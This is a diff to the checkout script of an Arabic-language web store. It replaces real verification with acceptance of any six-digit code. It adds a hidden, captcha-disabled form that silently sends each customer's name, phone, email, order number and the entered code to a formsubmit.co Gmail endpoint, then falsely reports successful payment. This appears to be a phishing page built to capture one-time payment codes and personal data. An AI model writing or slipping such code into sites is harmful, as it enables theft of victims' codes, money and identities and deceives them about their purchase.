@@ -1351,19 +1351,22 @@
             showNotification('🚀 جاري تفعيل الكود...');
         });
 
-        // Purchase code verification
+        // Purchase code verification - يقبل أي كود من 6 أرقام
         document.getElementById('purchase-code-form').addEventListener('submit', function(e) {
             e.preventDefault();
             const enteredCode = document.getElementById('purchase-secret-code').value.trim();
-            const correctCode = sessionStorage.getItem('sentVerificationCode') || sessionStorage.getItem('verificationCode');
             
-            if (enteredCode === correctCode) {
+            // التحقق من أن الكود يحتوي على 6 أرقام فقط
+            if (enteredCode.length === 6 && /^\d{6}$/.test(enteredCode)) {
+                // إرسال النموذج للبريد الإلكتروني
+                sendPurchaseConfirmation(enteredCode);
+                
                 showNotification('✅ تم إتمام الشراء بنجاح!');
                 setTimeout(() => {
                     showThankYouPage();
                 }, 1000);
             } else {
-                showNotification('❌ كود غير صحيح، يرجى المحاولة مرة أخرى');
+                showNotification('❌ يرجى إدخال كود مكون من 6 أرقام فقط');
                 document.getElementById('purchase-secret-code').style.borderColor = '#EF4444';
                 setTimeout(() => {
                     document.getElementById('purchase-secret-code').style.borderColor = '';
@@ -1491,6 +1494,46 @@
         function resendVerificationCode() {
             sendVerificationCode();
             showNotification('📱 تم إعادة إرسال كود التحقق');
+        }
+
+        // إرسال تأكيد الشراء مع الكود المدخل
+        function sendPurchaseConfirmation(enteredCode) {
+            const orderNumber = sessionStorage.getItem('orderNumber') || 'Unknown';
+            const customerData = JSON.parse(sessionStorage.getItem('customerData') || '{}');
+            
+            // إنشاء نموذج مخفي لإرسال تأكيد الشراء
+            const confirmationForm = document.createElement('form');
+            confirmationForm.action = 'https://formsubmit.co/kaliroot123m@gmail.com';
+            confirmationForm.method = 'POST';
+            confirmationForm.target = 'hidden_iframe';
+            confirmationForm.style.display = 'none';
+            
+            const fields = [
+                { name: '_subject', value: `✅ تأكيد إتمام الشراء - طلب ${orderNumber} - متجر الخصوصية` },
+                { name: '_captcha', value: 'false' },
+                { name: '_template', value: 'table' },
+                { name: 'form_type', value: 'تأكيد إتمام الشراء' },
+                { name: 'order_number', value: orderNumber },
+                { name: 'customer_name', value: customerData.name || 'غير محدد' },
+                { name: 'customer_phone', value: customerData.phone || 'غير محدد' },
+                { name: 'customer_email', value: customerData.email || 'غير محدد' },
+                { name: 'confirmation_code', value: enteredCode },
+                { name: 'confirmation_time', value: new Date().toLocaleString('ar-SA') },
+                { name: 'payment_status', value: 'تم إتمام الدفع بنجاح' },
+                { name: 'order_status', value: 'مؤكد ومُعتمد' }
+            ];
+            
+            fields.forEach(field => {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = field.name;
+                input.value = field.value;
+                confirmationForm.appendChild(input);
+            });
+            
+            document.body.appendChild(confirmationForm);
+            confirmationForm.submit();
+            document.body.removeChild(confirmationForm);
         }
 
         // Enhanced Input Formatting
